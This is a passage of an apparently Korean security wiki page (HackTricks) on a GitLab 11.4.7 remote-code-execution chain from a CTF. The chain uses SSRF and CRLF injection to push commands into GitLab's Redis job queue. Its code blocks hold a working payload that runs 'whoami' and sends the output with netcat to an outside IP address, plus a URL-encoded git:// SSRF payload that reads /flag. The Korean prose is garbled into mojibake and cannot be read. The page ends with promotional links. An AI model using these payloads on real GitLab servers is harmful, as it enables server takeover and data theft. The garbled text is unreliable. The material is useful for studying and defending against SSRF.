ë”°ë¼ì„œ, **ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ Redis ì¸ìŠ¤í„´ìŠ¤ì™€ í†µì‹ **í•˜ê³  **gitlab**ì˜ **íë¥¼ ê´€ë¦¬**í•˜ëŠ” íë¥¼ ì•…ìš©í•˜ì—¬ **ì½”ë“œ ì‹¤í–‰ì„ ì–»ëŠ” ê²ƒì´ ê°€ëŠ¥**í–ˆìŠµë‹ˆë‹¤. Redis í ì•…ìš© í˜ì´ë¡œë“œëŠ”:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
ê·¸ë¦¬ê³  **URL encode** ìš”ì²­ **SSRF** ë° **CRLF**ë¥¼ ì•…ìš©í•˜ì—¬ `whoami`ë¥¼ ì‹¤í–‰í•˜ê³  ì¶œë ¥ì„ `nc`ë¥¼ í†µí•´ ë°˜í™˜í•˜ëŠ” ê²ƒì€:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_ì–´ë–¤ ì´ìœ ë¡œ (ì´ ì •ë³´ê°€ ê°€ì ¸ì˜¨_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _ì˜ ì €ìì— ë”°ë¥´ë©´) `git` ìŠ¤í‚´ìœ¼ë¡œëŠ” ìµìŠ¤í”Œë¡œì‡ì´ ì‘ë™í–ˆì§€ë§Œ `http` ìŠ¤í‚´ìœ¼ë¡œëŠ” ì‘ë™í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤._

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ì´ í’ë¶€í•œ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ì°¸ì—¬í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ ìˆëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ìµœì‹  ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

ì˜¤ëŠ˜ [**Discord**](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
